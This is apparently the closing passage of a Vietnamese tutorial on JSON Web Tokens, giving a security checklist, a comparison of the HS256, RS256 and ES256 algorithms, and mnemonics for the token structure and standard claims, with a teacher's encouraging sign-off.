□ JWT = Header + Payload + Signature  
□ JWT **không** mã hóa, chỉ **ký** (trừ JWE)  
□ Luôn verify signature trước khi tin tưởng  
□ Luôn chỉ định `algorithms` khi verify  
□ Validate claims: exp, aud, iss...  
□ Secret key phải đủ dài (min 32 chars cho HS256)  
□ Dùng HTTPS khi truyền JWT  
□ Không lưu sensitive data trong JWT (trừ khi dùng JWE)  
□ Set thời gian hết hạn hợp lý  
□ Dùng refresh token cho session dài  

### So sánh nhanh các thuật toán

| Algorithm | Type | Speed | Security | When to use |
|-----------|------|-------|----------|-------------|
| HS256 | Symmetric | Fast | Good | Single server |
| RS256 | Asymmetric | Medium | Good | Microservices |
| ES256 | Asymmetric | Fast | Better | Modern systems |

### Tips ghi nhớ

**JWT Structure:**
- **H**eader
- **P**ayload  
- **S**ignature

**Claims chuẩn:**
- **ISS**uer - Ai phát hành
- **SUB**ject - Về ai
- **AUD**ience - Cho ai
- **EXP**iration - Hết hạn khi nào
- **IAT** - Issued **AT** - Cấp lúc nào

**Quy tắc vàng:**
> "Không tin JWT nào không verify được!"

---

**🎓 Kết luận**

Em đã học xong phần cơ bản và một số nội dung nâng cao về JWT rồi đấy! JWT là một công cụ mạnh mẽ nhưng cũng cần dùng đúng cách. Hãy nhớ:

1. **Luôn verify** signature
2. **Luôn validate** claims
3. **Luôn dùng HTTPS**
4. **Không lưu** password trong JWT
5. **Cẩn thận** với thời gian hết hạn

Chúc em học tốt! Có câu hỏi gì cứ hỏi thầy nhé! 😊
